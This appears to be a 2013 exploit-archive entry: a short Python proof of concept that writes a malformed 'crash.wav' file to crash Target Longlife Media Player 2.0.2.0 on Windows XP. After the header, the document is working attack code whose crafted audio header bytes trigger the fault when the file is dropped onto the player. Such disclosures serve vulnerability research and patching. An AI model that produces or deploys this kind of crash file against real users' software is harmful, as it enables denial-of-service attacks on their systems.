# Exploit Title		: Target Longlife Media Player Version 2.0.2.0 - (.wav) - Crash POC
# Date				: 11-09-2013
# Exploit Author	: gunslinger_ <yuda at cr0security.com> - http://www.cr0security.com
# Software Link		: http://download.cnet.com/Target-Longlife-Media-Player/3000-2139_4-10417975.html
# Version			: 2.0.2.0 (Probably old version of software and the LATEST version too)
# Vendor Homepage	: -
# Tested on			: Windows XP sp3
#============================================================================================
# After creating POC file (.wav), and simply drag and drop it to Player.
#============================================================================================
#!/usr/bin/python
 
string=("\x2E\x73\x6E\x64\x00\x00\x01\x18\x00\x00\x42\xDC\x00\x00\x00\x01"
"\x00\x00\x1F\x40\x00\x00\x00\x00\x69\x61\x70\x65\x74\x75\x73\x2E"
"\x61\x75\x00\x20\x22\x69\x61\x70\x65\x74\x75\x73\x2E\x61\x75\x22")
 
filename = "crash.wav"
file = open(filename , "w")
file.write(string)
file.close()

